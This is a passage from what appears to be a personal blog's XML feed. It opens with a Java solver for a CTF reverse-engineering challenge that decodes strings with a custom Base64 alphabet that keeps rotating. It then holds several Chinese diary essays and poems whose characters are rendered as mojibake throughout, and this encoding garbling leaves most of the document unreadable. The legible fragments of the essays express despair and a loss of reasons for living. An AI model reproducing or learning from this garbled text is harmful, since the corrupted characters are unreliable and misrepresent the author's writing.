class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>  &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">Hint</span> <span class="operator">=</span> <span class="string">&quot;key is a meaningful string.&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="type">char</span>[] str = &#123;<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">c</span> <span class="operator">=</span> test.i3;</span><br><span class="line">        String a[] = &#123;<span class="string">&quot;SJNPhthkmYBHow5Y75wRDa==&quot;</span>, Â·Â·Â·,&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> test.decode(a[i]);</span><br><span class="line">            System.out.println(a[i]);</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decode</span><span class="params">(String code)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> code.length();</span><br><span class="line">        <span class="keyword">if</span> (length == <span class="number">0</span> || length % <span class="number">4</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">endEqualNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (code.endsWith(<span class="string">&quot;==&quot;</span>)) &#123;</span><br><span class="line">            endEqualNum = <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code.endsWith(<span class="string">&quot;=&quot;</span>)) &#123;</span><br><span class="line">            endEqualNum = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        code.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(length);</span><br><span class="line">        <span class="type">int</span> <span class="variable">blockNum</span> <span class="operator">=</span> length / <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; blockNum; i++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">afterDecode</span> <span class="operator">=</span> decodeDetail(code.substring(i * <span class="number">4</span>, (i * <span class="number">4</span>) + <span class="number">4</span>));</span><br><span class="line">            sb.append(afterDecode);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">        <span class="keyword">return</span> result.substring(<span class="number">0</span>, result.length() - endEqualNum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">decodeDetail</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> str.length();</span><br><span class="line">        <span class="keyword">if</span> (len != <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a1</span> <span class="operator">=</span> getIndex(str.charAt(<span class="number">0</span>));</span><br><span class="line">        qwq();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a2</span> <span class="operator">=</span> getIndex(str.charAt(<span class="number">1</span>));</span><br><span class="line">        qwq();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a3</span> <span class="operator">=</span> getIndex(str.charAt(<span class="number">2</span>));</span><br><span class="line">        qwq();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a4</span> <span class="operator">=</span> getIndex(str.charAt(<span class="number">3</span>));</span><br><span class="line">        qwq();</span><br><span class="line">        <span class="type">char</span>[] b = &#123;(<span class="type">char</span>) ((a1 &lt;&lt; <span class="number">2</span>) | ((a2 &amp; <span class="number">48</span>) &gt;&gt; <span class="number">4</span>)), (<span class="type">char</span>) (((a2 &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span>) | ((a3 &amp; <span class="number">60</span>) &gt;&gt; <span class="number">2</span>)), (<span class="type">char</span>) (((a3 &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) | a4)&#125;;</span><br><span class="line">        <span class="keyword">return</span> String.copyValueOf(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getIndex</span><span class="params">(<span class="type">char</span> c)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">char</span>[] cArr = <span class="built_in">this</span>.str;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; cArr.length) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cArr[i] != c) &#123;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">qwq</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] tmp = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">64</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">char</span>[] cArr = <span class="built_in">this</span>.str;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; cArr.length) &#123;</span><br><span class="line">                tmp[i] = cArr[(i + <span class="number">2</span>) % <span class="number">64</span>];</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.str = (<span class="type">char</span>[]) tmp.clone();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>night</title>
      <link href="/2024/02/26/night/"/>
      <url>/2024/02/26/night/</url>
      
        <content type="html"><![CDATA[<p>ä½ çœŸçš„è§‰å¾—è‡ªå·±è¿™äºŒåå¹´æ¥çš„ç”Ÿæ´»å°±æ˜¯ä¸€æ­¥ä¸€æ­¥å¾€ä¸‹é¢èµ°ï¼Œä»¥ä¸ºçŸ­æš‚çš„è·³èµ·æ¥äº†å®é™…ä¸Šæ˜¯åœ¨å¾€ä¸‹é¢è·³ã€‚</p><p>å¸å¼•ä½ çš„ä¸œè¥¿ä¸€ç›´éƒ½æ²¡å˜ï¼Œåˆä¸­è¢«white nightå¸å¼•é«˜ä¸­æ²‰è¿·death driveã€‚ä¸Šäº†å¤§å­¦å˜æœ¬åŠ å‰æ¶è´¯æ»¡ç›ˆã€‚</p><p>ä½ ä¸ä¼šå¿˜è®°é‚£ä¸ªæ—¶å€™é¢¤æŠ–ç€æ‰‹èŠ±äº†å…­å—é’±ä¹°äº†ç“¶é›€å·¢ï¼Œæ™•å€’åœ¨ä¸€ç‰‡çƒŸé›¾å½“ä¸­çš„æ—¶å€™æƒ³èµ·ç¬¬ä¸€æ¬¡æ‘„å…¥å’–å•¡å› çš„å¿«æ„Ÿï¼Œä½ åˆè§‰å¾—å¯æ‚²äº†ã€‚æ˜æ˜å¥½åƒä¸€ç›´åœ¨å¼€æ‹“æ–°çš„è’åŸä½†æ˜¯å¥½åƒå…¨éƒ¨éƒ½æ˜¯ä¸€ä»¶ä¸œè¥¿å˜å‡ºæ¥çš„å¹»å½±ï¼Œä½ çŸ¥é“é‚£ä¸ªä¸œè¥¿æ˜¯ä»€ä¹ˆä½ è®¨åŒå®ƒä½†æ˜¯è‡£æœäºå®ƒã€‚</p><p>å¥½æ¶å¿ƒå¥½æ¶å¿ƒå¥½æ¶å¿ƒï¼Œæ¶å¿ƒä¸€ä¸‡éä¹‹åå°±ä¼šä¹ æƒ¯ï¼Œè¦ä¹ˆå°±æ¢ç§æ–¹å¼ç»§ç»­æ¶å¿ƒæ–°çš„ä¸œè¥¿ä½†æ˜¯ä½ é™¤äº†ä¸€ç›´å¬ä¸€ç›´çœ‹ä¸€ç›´è¯´ç„¶åç¡è¿‡å»é†’æ¥å¿˜è®°å…¨éƒ¨ç»†èŠ‚ï¼Œé¡ºå…¶è‡ªç„¶ç®€ç›´æ˜¯ä¸€ä¸ªå¯ç¬‘çš„å€Ÿå£å¯ç›´åˆ°ç°åœ¨ä½ ä¹Ÿæ·±ä¿¡ä¸ç–‘ã€‚</p><p>å‡ åˆ†é’Ÿå‰è¿˜åœ¨è‡ªæˆ‘æ„ŸåŠ¨ï¼Œç„¶åçªç„¶æ„Ÿåˆ°ç„¦è™‘ï¼Œå‡ åˆ†é’Ÿä¹‹ååˆè‹¥æ— å…¶äº‹çš„æŠŠèº«ä½“äº¤ç»™æ¬²æœ›ï¼Œç„¶åå‡è£…å¿æ‚”ã€‚</p><p>çœ‹åˆ°é‚£å¥ <strong>â€œYou fall hard for what you know, harder for what you donâ€™t.â€</strong> è„‘å­é‡Œé¢åˆä¸€ç‰‡ç©ºç™½äº†ã€‚è¿™ä¸ªä¸–ç•Œä¸Šçš„å¥½å¤šä¸œè¥¿ä½ ä»¥ä¸ºæŠ“åˆ°æœ¬è´¨äº†ï¼Œæ‰€ä»¥ä½ è¯´æ— ä¸ºä½ è¯´æ— æ‰€ä½ï¼Œå‘µå‘µã€‚</p><p>æŸ¿å­æœ€è€€çœ¼çš„æ—¶å€™æ˜¯ç†Ÿé€çš„æ—¶å€™ï¼Œç†Ÿé€äº†å°±ä¼šåæ‰ï¼Œå°±ä¼šè…çƒ‚ï¼Œå°±ä¼šå‘è‡­ã€‚é‚£ä½ ä»€ä¹ˆæ—¶å€™è…çƒ‚ï¼Œä»€ä¹ˆæ—¶å€™å‘è‡­å‘¢ã€‚</p><p>ä½ æ€»è§‰ä»¥ä¸ºè‡ªå·±æ²¡è§è¿‡çœŸæ­£çš„å…‰ä»¥è‡³äºä½ çš„è„‘ä¸­æ²¡æœ‰é‚£äº›ç”»é¢ã€‚ä½†ä½ æƒ³èµ·æ¥å°æ—¶å€™åšæ¢¦çš„æ—¶å€™æ˜¯æœ‰é‚£äº›ä¸œè¥¿çš„ï¼Œä¼šæœ‰æ—©æ™¨ç™½çš„åˆºçœ¼çš„é˜³å…‰å’Œå‘å‡ºå¥½é—»çš„å‘³é“çš„ä¸€å°˜ä¸æŸ“çš„ç™½è‰²åºŠå•ã€‚ç°åœ¨ä½ çš„æ¢¦é‡Œé¢æ˜¯ä½ å®³æ€•çš„è€é¼ å’Œæ¯”äººè¿˜å¤§çš„é¸¡ï¼Œæ˜¯èµ¤è£¸çš„å‹è¿«çš„æ¬²æœ›ã€‚ä½ è¯´ä½ æƒ³ä¸å‡ºæ¥äº†ï¼Œæƒ³ä¸åˆ°ä¸¤ä¸ªäººç›¸çˆ±æ˜¯ä»€ä¹ˆæ ·å­æƒ³ä¸å‡ºæƒ³è¦çš„ç”Ÿæ´»æ˜¯ä»€ä¹ˆæ ·å­ä¹Ÿæƒ³ä¸å‡ºæ¥è‡ªå·±åˆ°åº•æ˜¯åœ¨ä¸ºä»€ä¹ˆæ´»ç€äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆ‘ä¸å¸Œæœ›æœ€ç¾å¥½çš„äº‹æƒ…éƒ½å‘ç”Ÿåœ¨è¿‡å»</title>
      <link href="/2024/02/09/%E6%88%91%E4%B8%8D%E5%B8%8C%E6%9C%9B%E6%9C%80%E7%BE%8E%E5%A5%BD%E7%9A%84%E4%BA%8B%E6%83%85%E9%83%BD%E5%8F%91%E7%94%9F%E5%9C%A8%E8%BF%87%E5%8E%BB/"/>
      <url>/2024/02/09/%E6%88%91%E4%B8%8D%E5%B8%8C%E6%9C%9B%E6%9C%80%E7%BE%8E%E5%A5%BD%E7%9A%84%E4%BA%8B%E6%83%85%E9%83%BD%E5%8F%91%E7%94%9F%E5%9C%A8%E8%BF%87%E5%8E%BB/</url>
      
        <content type="html"><![CDATA[<p>åˆæ˜¯ä¸€å¹´é™¤å¤•ï¼Œå›é¡¾è‡ªé«˜ä¸­ä»¥æ¥çš„æ¯ä¸€æ¬¡é™¤å¤•ï¼Œå¥½åƒéƒ½æˆ–å¤šæˆ–å°‘æœ‰ç€ä¸€äº›ä¸å¤ªå¯»å¸¸çš„äº‹æƒ…å‘ç”Ÿã€‚é«˜ä¸€è·¨å¹´å‡†ç‚¹æ”¶åˆ°ä¸€å°æ„ä¹‰éå‡¡çš„æƒ…ä¹¦ï¼Œé«˜äºŒé™¤å¤•cjæ¥æˆ‘å®¶æ‰¾æˆ‘ï¼Œä¸¤ä¸ªäººåœ¨ç©ºæ— ä¸€äººçš„è¡—é“ä¸Šæ‰¾å®µå¤œï¼Œèµ°äº†å¿«ä¸¤é‡Œè·¯åœ¨ä¸€ä¸ªå¾ˆåçš„åœ°æ–¹é‡è§ä¸€ä¸ªåŒæ ·æ²¡å›å®¶çœ‹æ˜¥æ™šçš„å¤§å”å–çƒ§çƒ¤ï¼Œä¸‰ä¸ªç•¥æ˜¾å­¤ç‹¬çš„äººååœ¨å¯’é£ä¸­åƒç€çƒ¤ä¸²ï¼Œæœ‰ä¸€å¥æ²¡ä¸€å¥çš„èŠç€å®¶åº­ï¼Œè¿‡å»ï¼Œå’Œæœªæ¥ã€‚é«˜ä¸‰è·¨å¹´é‚£æ™šæŠŠè‡ªå·±é”åœ¨æˆ¿é—´é‡Œä¸€ä¸ªäººçœ‹å®Œäº†æ•´æœ¬ã€Šä½ å½“åƒé¸Ÿé£è¿‡ä½ çš„å±±ã€‹ï¼Œç„¶åæ—©æ—©çš„ç¡å»ã€‚å¤§ä¸€çš„é™¤å¤•å‘¢ï¼Œæ²¡å•¥å°è±¡äº†ï¼Œå¥½åƒè¿˜åœ¨å¿™ç€å‡†å¤‡é‚£å¹´çš„æœŸæœ«è€ƒè¯•ã€‚å¤§äºŒçš„é™¤å¤•ï¼Œä¸€ä¸ªäººï¼Œåœ¨æ·±åœ³ï¼Œå’ŒTIMæ‰¾äº†å®¶é£è¯„ä¸é”™çš„é¤å…åƒæµ·é²œï¼Œç„¶è€Œå¹¶ä¸æ˜¯å¾ˆå¥½åƒï¼Œæ²‰é»˜çš„åƒå®Œï¼Œæ²‰é»˜çš„ç¦»å¼€ï¼Œå›åˆ°å‡ºç§Ÿå±‹ï¼Œæ‰‹æœºé‡Œæ˜¯å„ç§äººå‘æ¥çš„æ¶ˆæ¯ï¼Œç¥ç¦ï¼Œçº¢åŒ…ã€‚åˆè®¤è¯†äº†å¾ˆå¤šäººï¼Œä¹Ÿå¿˜è®°äº†å¾ˆå¤šäººã€‚</p><p>æœªæ¥æœªæ¥ï¼Œæˆ‘å·²ç»èµ°åœ¨ä¸€æ¡æ­§è·¯ä¸Šåˆä½•è°ˆæœªæ¥å‘¢ã€‚ä¸€ç›´ä»¥æ¥é•¿ä¹…çš„å¸å¼•æˆ‘çš„åªæœ‰æ–‡å­—ã€‚æˆ‘çš„ç”Ÿæ´»æˆ‘çš„æ„Ÿæƒ…æ—¶æ—¶åˆ»åˆ»æ”¶åˆ°å®ƒçš„å½±å“ã€‚æ‚²å“€ã€‚å¦‚æœå½“åˆæ²¡æœ‰é€‰æ‹©è¿™æ¡è·¯ï¼Œç°åœ¨æˆ‘åˆåœ¨æ„è‹¦äºä»€ä¹ˆå‘¢ã€‚å¥½åƒæ–‡å­—ä¸èƒ½æ‹¯æ•‘æˆ‘ï¼Œå®ƒåªèƒ½è®©æˆ‘æ›´åŠ æ¸…é†’ï¼Œä¹Ÿæ›´åŠ æ‚²å“€ã€‚</p><p>æœ€è¿‘é‚£ä¸ªåå­—åˆæ€»æ˜¯å‡ºç°åœ¨æˆ‘çš„è„‘å­é‡Œé¢ï¼Œä¸€äº›æ›¾ç»è¾‰ç…Œçš„ç¥ç¨ä¸€åˆ‡çš„ï¼Œå…¨éƒ½ä¸è§äº†ï¼Œyyåœ¨ç¥åŒ–çš„é‚£ä¸€æ®µè¿‡å¾€ï¼Œè€Œæˆ‘ä¹Ÿä¸å†æèµ·ã€‚è¨€è¯­ä¸Šå¦å®šäº†æ›¾ç»ï¼Œè¡Œä¸ºå´æ›´åŠ æ€¥ä¸å¯è€çš„è¯æ˜äº†ä¸€åˆ‡ã€‚è¯­è¨€çš„è¾¹ç•Œå¯ä»¥å†³å®šæ€æƒ³çš„è¾¹ç•Œï¼Œè€Œä¹ æƒ¯æ›´æ˜¯æ— å½¢ä¸­ç¦é”¢ä¸€ä¸ªäººçš„é•£é“ã€‚ä¸€ä»¶å¯æ€•çš„äº‹æƒ…æ˜¯è¿™ä¸¤æ ·æˆ‘å…¨å äº†ã€‚</p><p>ä¸€ç›´ä»¥æ¥æ”¯æ’‘è¿™æˆ‘å‰è¡Œçš„åŠ¨åŠ›åœ¨äºï¼šæˆ‘ä¸å¸Œæœ›æœ€ç¾å¥½çš„äº‹æƒ…éƒ½å‘ç”Ÿåœ¨è¿‡å»ã€‚ä½†ç°åœ¨å´è¿·èŒ«äº†ï¼Œå½“æˆ‘å‘ç°æˆ‘å›å¿†è¿‡å»æ€€å¿µè¿‡å»ï¼Œæ—¥å¤ä¸€æ—¥æ— æ³•è‡ªæ‹”çš„æ—¶å€™ï¼Œçš„ç¡®æ˜¯ç‹ ç‹ çš„è¿·èŒ«äº†ã€‚ç»å†çš„è¶Šå¤šï¼Œæ¢¦å°±è¶Šç ´ç¢ä¸€åˆ†ã€‚</p><p>è¿‡å»ã€‚æˆ‘å§‹ç»ˆä¸æ˜ç™½è®°å¿†å¯¹äººè€Œè¨€åˆ°åº•æ„å‘³ç€ä»€ä¹ˆã€‚æˆ‘åœ¨ä¸€äº›æ—¶åˆ»è¿‘ä¹ç–¯ç‹‚çš„ä¿ç•™æˆ‘å†™çš„æ¯ä¸€ä»½æ–‡å­—ï¼Œåœ¨æˆ‘èƒ½æƒ³å¾—åˆ°ä»»ä½•çš„åœ°æ–¹ç»™å®ƒä»¬å¤‡ä»½ï¼Œåˆåƒæ–¹ç™¾è®¡åœ°é˜»æ­¢ä»»ä½•ä¸€ä¸ªå¤–äººçœ‹åˆ°å®ƒä»¬ã€‚æˆ‘æ—¶å¸¸è§‰å¾—å®ˆä½äº†ä»–ä»¬å°±å®ˆä½äº†ä»£è¡¨æˆ‘ä¸€éƒ¨åˆ†ç”Ÿå‘½çš„è¿‡å»ï¼Œè¿™æ ·æˆ‘æ´»ç€çš„é‡é‡å°±åˆåŠ é‡ä¸€åˆ†ã€‚å¯æ˜¯åŒæ ·æˆ‘åˆæ‚²å“€çš„å‘ç°äººèƒ½è®°ä½çš„ä¸œè¥¿çš„æ€»é‡å¤§çº¦æ˜¯å®ˆæ’çš„ã€‚å¥½å§ï¼Œè‡³å°‘æˆ‘è¿˜æ˜¯ä¸€ç›´æµåŠ¨çš„ã€‚</p><p>ä»”ç»†ä¸€æƒ³ï¼Œå¥½åƒæœ‰å¤§çº¦ä¸è¶…è¿‡äºŒåä¸ªè¯ï¼Œå°±èƒ½å®Œå®Œå…¨å…¨æ¦‚æ‹¬æˆ‘ç°åœ¨çš„ç”Ÿæ´»å’Œæˆ‘çš„æ–‡å­—ã€‚è¿™äºŒåä¸ªè¯å°±åƒä¸€æ¡å¾ˆç»†å¾ˆç»†çš„ç»³å­ï¼Œç‰¢ç‰¢åœ°ç¦é”¢ä½äº†æˆ‘çš„çµé­‚ã€‚å“ˆå“ˆï¼Œå¯ç¬‘çš„æ˜¯æˆ‘å¥½åƒå¹¶æ²¡æœ‰æƒ³è¦é€ƒå‡ºæ¥ç”šè‡³è¶Šé™·è¶Šæ·±ï¼Œæ·±å…¥åˆ°è‚‰é‡Œï¼Œåˆ°éª¨é«“é‡Œï¼Œæˆ‘è¿˜åœ¨ä¸€è¾¹ç—›ç€ä¸€è¾¹ä¸ºè¿™å‹’ç—•èµ‹è¯—ã€‚å¥½å§ï¼Œå¦‚æœæˆ‘åšæŒå†™è¯—çš„è¯æˆ‘ä¼šå¾ˆæ—©å°±å‘ç°è¿™ä¸€ç‚¹çš„ï¼Œå¯æ˜¯æˆ‘è¿è¯—æ­Œä¹Ÿå·®ä¸å¤šæŠ›å¼ƒæ‰äº†ã€‚ã€‚</p><p>Fineï¼Œäººæ€»æ˜¯æ¸´æœ›èœ•å˜åˆä¸å±‘äºç»éªŒçš„ã€‚æŠ›å¼ƒäº†ä»»ä½•äº‹ç‰©ä¸å®ƒçš„å¯¹ç«‹é¢ï¼Œæ€»æ˜¯è¿˜æœ‰ä¸€æ¡ç”Ÿå‘½çº¿åœ¨æµåŠ¨å§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>asphyxia_0</title>
      <link href="/2024/01/16/asphyxia-0/"/>
      <url>/2024/01/16/asphyxia-0/</url>
      
        <content type="html"><![CDATA[<p>æ”¶å½•é«˜ä¸­å†™çš„ä¸€äº›å°è¯—</p><hr><blockquote><p>ç©ºè¡çš„æ¹–é¢ï¼Œ</p><p>æ½¦æ¼«çš„é›¾å…‰ï¼Œ</p><p>æˆ‘åœ¨èˆŸä¸­å½·å¾¨ã€‚</p><p>é™é™åœ°ç­‰ï¼Œ</p><p>ä¸€åœºä¸å¯»å¸¸çš„æ—¥å‡ºï¼Œ</p><p>æˆ–æ˜¯ä¸€åªè®°å¿†ä¸­çš„è´è¶ã€‚</p><p>ä½†æˆ‘æ˜ç™½ï¼Œ</p><p>æ¹–å¿ƒå¤„æ˜¯å¯¸è‰ä¸ç”Ÿçš„ï¼Œ</p><p>è´«ç˜ ä¹‹å²›ã€‚</p></blockquote><blockquote><p>ç©ºè¡çš„æ¹–é¢ï¼Œ</p><p>æ½¦æ¼«çš„é›¾å…‰ï¼Œ</p><p>æˆ‘åœ¨èˆŸä¸­å½·å¾¨ã€‚</p><p>é—®é—®æ¹–ç¥ï¼Œ</p><p>ä½•å¤„å¯é€šå¾€çˆ±æƒ…ä¹‹æµ·ï¼Ÿ</p><p>æ²‰é»˜ï¼Œç»æœ›çš„æ²‰é»˜ã€‚</p><p>åƒä¸‡é¢—æ°´ç é™æ­¢ä¸è„šä¸‹ã€‚</p><p>â€œä»€ä¹ˆæ˜¯çˆ±æƒ…ï¼Ÿ</p><p>æˆ‘åªçŸ¥å†¬æ—¥å†°å†»çš„é±¼å’Œå¤æ—¥å–·æ¶Œçš„åµã€‚â€</p></blockquote><blockquote><p>ç©ºè¡çš„æ¹–é¢ï¼Œ</p><p>æ½¦æ¼«çš„é›¾å…‰ï¼Œ</p><p>æˆ‘åœ¨èˆŸä¸­å½·å¾¨ã€‚</p><p>çœ‹çœ‹å¤©ç©ºï¼Œ</p><p>æœŸå¾…æ˜æ—¥æ¼«å¤©çš„é£é›ªã€‚</p><p>é—®é—®å°é¸Ÿï¼Œ</p><p>è¥¿è¾¹çš„æ£®æ—å¯æœ‰æå…‰ï¼Ÿ</p><p>å®ƒæŒ¯æŒ¯åŒç¿…ï¼Œ</p><p>ä¸œè¾¹çš„åŸé‡é‡Œæœ‰ä¸€æ ‘æ¨±æ¡ƒã€‚</p></blockquote><hr><hr><blockquote><p>å¿«ä¹çš„äººæ— 